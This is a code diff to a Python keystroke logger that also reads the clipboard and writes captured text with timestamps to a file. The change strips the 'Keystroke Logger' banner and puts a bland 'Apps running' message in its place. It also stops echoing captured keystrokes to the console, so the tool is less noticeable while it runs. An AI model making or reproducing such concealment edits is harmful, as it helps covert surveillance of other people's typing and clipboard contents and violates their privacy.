@@ -21,13 +21,7 @@ def main():
     buffer = []
     line_count = 0
 
-    print("=" * 50)
-    print("  Keystroke Logger")
-    print("=" * 50)
-    print(f"  Output : {filepath}")
-    print(f"  Quit   : Ctrl+C")
-    print("=" * 50)
-    print()
+    print("Apps running, press Ctrl+C to stop")
 
     # Tulis header di file
     with open(filepath, "w", encoding="utf-8") as f:
@@ -47,7 +41,6 @@ def main():
         with open(filepath, "a", encoding="utf-8") as f:
             f.write(line + "\n")
 
-        print(f"  #{line_count} [{ts}] {text}")
         buffer.clear()
 
     def get_clipboard_text():
@@ -122,15 +115,11 @@ def main():
         f.write(f"Session ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write(f"Total lines captured: {line_count}\n")
 
-    print()
-    print("=" * 50)
-    print(f"  Session ended. Total lines: {line_count}")
+    print(f"Session ended. Total lines: {line_count}")
     if line_count > 0:
-        print(f"  Saved to: {filepath}")
+        print(f"Saved to: {filepath}")
     else:
         os.remove(filepath)
-        print("  No keystrokes captured. File not created.")
-    print("=" * 50)
 
 
 if __name__ == "__main__":
